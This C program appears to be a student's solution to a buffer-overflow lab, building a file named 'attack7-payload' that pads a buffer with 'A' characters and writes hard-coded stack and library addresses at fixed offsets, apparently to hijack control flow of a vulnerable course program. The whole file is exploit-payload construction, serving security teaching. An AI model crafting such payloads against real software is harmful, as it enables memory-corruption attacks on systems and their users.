#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	int buf_len=V7_SIZE+37;
	char buf[buf_len];
	memset(buf,'A',buf_len);
	buf[203]=0xc8;buf[204]=0xef;buf[205]=0xff;buf[206]=0xbf;
	buf[207]=0x80;buf[208]=0x16;buf[209]=0xe5;buf[210]=0xb7;
	buf[211]=0xff;buf[212]=0x86;buf[213]=0x04;buf[214]=0x08;
	buf[215]=0xeb;buf[216]=0xb4;buf[217]=0x04;buf[218]=0x08;
	buf[219]=0x72;buf[220]=0x61;buf[221]=0x68;buf[222]=0x75;
	buf[223]=0x6c;
    write_to_file( "attack7-payload", buf, buf_len, FILE_CLEAR );
    exit(0);
}
